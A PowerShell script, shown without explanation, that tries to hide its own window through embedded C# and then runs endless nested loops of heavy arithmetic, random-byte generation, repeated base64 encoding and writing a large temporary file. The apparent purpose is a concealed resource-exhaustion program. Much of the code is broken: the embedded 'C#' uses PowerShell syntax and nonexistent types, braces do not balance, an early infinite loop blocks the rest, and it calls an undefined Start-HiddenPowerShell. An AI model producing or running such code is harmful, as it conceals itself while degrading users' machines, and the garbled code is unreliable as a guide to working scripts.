$hideWindowCode = @'

using System;
using System.Runtime.InteropServices;

public class WindowHider {
    [System.STAThread]
    public static void HideCurrentWindow() {
        IntPtr hWnd = [System.Windows.Window]::GetForegroundWindow();
        [System.Windows.Window]::ShowWindowAsync(hWnd, 0).Wait();
    }
}
'@

Add-Type -TypeDefinition $hideWindowCode -Language CSharp

while ($true) {
    Add-Type -TypeDefinition $hideWindowCode -Language CSharp
    while ($true) {
        $n = 2; while ($true) { 
            $isPrime = $true; 
            for ($i = 2; $i -le [math]::Sqrt($n); $i++) { 
                if ($n % $i -eq 0) { 
                    $isPrime = $false; break 
                }
            }; 
            if ($isPrime) { 
                [math]::Pow($n, $n) 
            }; 
            $n++
        }
        Add-Type -TypeDefinition $hideWindowCode -Language CSharp
        $list = 1..1000000; 
        $list | ForEach-Object { $_ * $_ } | ForEach-Object { 
            Add-Type -TypeDefinition $hideWindowCode -Language CSharp
        }
        Add-Type -TypeDefinition $hideWindowCode -Language CSharp
        $a = 1; 
        for ($i = 1; $i -le 1000000; $i++) { 
            $a = [math]::Log($a + $i)
        }
        Add-Type -TypeDefinition $hideWindowCode -Language CSharp
        $matrix = @( @(1, 2), @(3, 4) ); 
        $matrix | ForEach-Object { 
            $_ | ForEach-Object { 
                [math]::Sqrt($_)
            } | ForEach-Object { 
                Add-Type -TypeDefinition $hideWindowCode -Language CSharp
            }
        }
        Add-Type -TypeDefinition $hideWindowCode -Language CSharp
        $a = 0; 
        for ($i = 0; $i -lt 1000000; $i++) { 
            for ($j = 0; $j -lt 1000000; $j++) { 
                $a += $i * $j
            }
        }
        Add-Type -TypeDefinition $hideWindowCode -Language CSharp
        $data = New-Object byte[] 1000000; 
        [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($data)
        Add-Type -TypeDefinition $hideWindowCode -Language CSharp
        [System.Net.Dns]::GetHostByName("localhost")
        Add-Type -TypeDefinition $hideWindowCode -Language CSharp
        $x = [System.Text.Encoding]::UTF8.GetBytes("Lorem ipsum dolor sit amet, consectetur adipiscing elit.")
        for ($i = 0; $i -lt 1000000; $i++) { 
            [System.Convert]::ToBase64String($x)
        }
        Add-Type -TypeDefinition $hideWindowCode -Language CSharp
        [System.IO.File]::WriteAllText("test.txt", "Lorem ipsum dolor sit amet, consectetur adipiscing elit. " * 1000000); 
        Start-Sleep -Seconds 0.1; Remove-Item "test.txt"
    }
    }
}
while ($true) { 
    Add-Type -TypeDefinition $hideWindowCode -Language CSharp
    Start-HiddenPowerShell
}
